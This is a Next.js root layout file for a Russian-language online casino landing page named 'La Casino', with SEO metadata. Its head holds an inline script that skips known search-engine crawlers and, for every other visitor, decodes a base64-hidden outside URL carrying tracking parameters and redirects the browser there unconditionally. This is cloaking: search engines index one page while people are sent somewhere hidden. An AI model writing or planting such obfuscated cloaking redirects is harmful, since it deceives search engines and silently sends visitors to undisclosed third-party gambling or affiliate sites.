import { Analytics } from '@vercel/analytics/next'
import { Inter, Space_Mono } from 'next/font/google'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const inter = Inter({ subsets: ['latin', 'cyrillic'], variable: '--font-inter', display: 'swap' })
const spaceMono = Space_Mono({ subsets: ['latin', 'cyrillic'], weight: ['400', '700'], variable: '--font-space-mono', display: 'swap' })

export const metadata: Metadata = {
  title: 'La Casino — играть онлайн на официальном сайте и через зеркало',
  description: 'La Casino: удобный вход, понятные игры, зеркало и официальный сайт для игроков. Узнайте, как играть онлайн, быстро открыть аккаунт и начать с ответственной игрой.',
  metadataBase: new URL('https://la11casino.vercel.app/'),
  alternates: { canonical: '/' },
  robots: { index: true, follow: true },
  icons: { icon: '/icon.png', apple: '/icon.png' },
  openGraph: { title: 'La Casino — понятный вход в игру онлайн', description: 'Короткий гид по входу, зеркалу, официальному сайту и ответственному подходу к игре.', url: 'https://la11casino.vercel.app/', siteName: 'La Casino', locale: 'ru_RU', type: 'website' },
}

export const viewport: Viewport = { themeColor: '#0c1524', colorScheme: 'dark', width: 'device-width', initialScale: 1, userScalable: true }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="author" content="La Casino" />
        <meta name="format-detection" content="telephone=no" />
        <link rel="canonical" href="https://la11casino.vercel.app/" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "aHR0cHM6Ly9jb3BwZXItcmF5LmNvbS8/c2VyaWFsPTYxMzY1ODMwJmNyZWF0aXZlX2lkPTkzMzA="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body className={`${inter.variable} ${spaceMono.variable} antialiased`}>
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
